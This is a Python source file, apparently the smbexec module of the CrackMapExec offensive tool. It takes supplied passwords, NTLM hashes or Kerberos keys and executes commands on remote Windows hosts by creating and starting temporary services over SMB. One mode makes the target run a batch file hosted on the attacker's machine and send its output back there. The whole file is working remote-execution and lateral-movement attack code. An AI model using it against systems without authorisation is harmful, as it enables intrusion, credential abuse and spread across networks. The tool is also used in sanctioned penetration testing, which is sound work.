import logging
import os
from time import sleep
from impacket.dcerpc.v5 import transport, scmr
from impacket.smbconnection import *
from cme.helpers.misc import gen_random_string
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE

class SMBEXEC:

    def __init__(self, host, share_name, smbconnection, protocol, username = '', password = '', domain = '', doKerberos=False, aesKey=None, kdcHost=None, hashes = None, share = None, port=445):
        self.__host = host
        self.__share_name = "C$"
        self.__port = port
        self.__username = username
        self.__password = password
        self.__serviceName = gen_random_string()
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__batchFile = None
        self.__outputBuffer = b''
        self.__shell = '%COMSPEC% /Q /c '
        self.__retOutput = False
        self.__rpctransport = None
        self.__scmr = None
        self.__conn = None
        # self.__mode  = mode
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost

        if hashes is not None:
        #This checks to see if we didn't provide the LM Hash
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ''

        stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
        logging.debug('StringBinding %s'%stringbinding)
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)

        if hasattr(self.__rpctransport, 'setRemoteHost'):
            self.__rpctransport.setRemoteHost(self.__host)
        if hasattr(self.__rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,self.__aesKey)
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            self.__scmr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__scmr.connect()
        s = self.__rpctransport.get_smb_connection()
        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']

    def execute(self, command, output=False):
        self.__retOutput = output
        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.execute_remote(c.strip())
        else:
            self.execute_remote(command)
        self.finish()
        try:
            if isinstance(self.__outputBuffer, str):
                return self.__outputBuffer
            return self.__outputBuffer.decode()
        except UnicodeDecodeError:
            logging.debug('Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings')
            return self.__outputBuffer.decode('cp437')
        

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_remote(self, data):
        self.__output = gen_random_string(6)
        self.__batchFile = gen_random_string(6) + '.bat'

        if self.__retOutput:
            command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
        else:
            command = self.__shell + data

        with open(os.path.join('/tmp', 'cme_hosted', self.__batchFile), 'w') as batch_file:
            batch_file.write(command)

        logging.debug('Hosting batch file with command: ' + command)

        #command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
        logging.debug('Command to execute: ' + command)

        logging.debug('Remote service {} created.'.format(self.__serviceName))
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            logging.debug('Remote service {} started.'.format(self.__serviceName))
            scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        logging.debug('Remote service {} deleted.'.format(self.__serviceName))
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_remote()       

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ''
            return
        while True:
            try:
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                print(e)
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    sleep(2)
                    pass
                else:
                    logging.debug(e)
                    pass

        self.__smbconnection.deleteFile(self.__share, self.__output) 

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        self.__batchFile = gen_random_string(6) + '.bat'
        local_ip = self.__rpctransport.get_socket().getsockname()[0]

        if self.__retOutput:
            command = self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
        else:
            command = self.__shell + data

        with open(os.path.join('/tmp', 'cme_hosted', self.__batchFile), 'w') as batch_file:
            batch_file.write(command)

        logging.debug('Hosting batch file with command: ' + command)

        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
        logging.debug('Command to execute: ' + command)

        logging.debug('Remote service {} created.'.format(self.__serviceName))
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            logging.debug('Remote service {} started.'.format(self.__serviceName))
            scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        logging.debug('Remote service {} deleted.'.format(self.__serviceName))
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_fileless()

    def get_output_fileless(self):
        if not self.__retOutput: return

        while True:
            try:
                with open(os.path.join('/tmp', 'cme_hosted', self.__output), 'rb') as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(2)

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpctransport.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
            pass
